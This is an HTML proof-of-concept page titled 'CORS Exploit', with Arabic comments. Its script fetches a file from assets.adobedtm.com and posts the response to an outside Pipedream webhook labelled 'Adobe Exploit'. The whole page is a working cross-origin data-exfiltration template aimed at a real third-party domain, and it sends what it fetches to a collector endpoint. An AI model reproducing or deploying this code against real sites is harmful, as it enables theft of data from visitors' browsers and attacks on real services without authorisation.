<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit</title>
</head>
<body>
    <h1>Exploit Running...</h1>
    
    <script>
        // استبدل الرابط برابط Pipedream الخاص بك
        const webhook = "https://eoajz7c5v00ct8t.m.pipedream.net";

        // استغلال CORS لجلب البيانات من assets.adobedtm.com
        fetch("https://assets.adobedtm.com/crossdomain.xml")
        .then(response => response.text())
        .then(data => {
            console.log("Data received from Adobe:", data);

            // إرسال البيانات إلى Pipedream
            fetch(webhook, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    source: "Adobe Exploit",
                    content: data
                })
            });
        })
        .catch(error => console.error("Exploit failed:", error));
    </script>

</body>
</html>
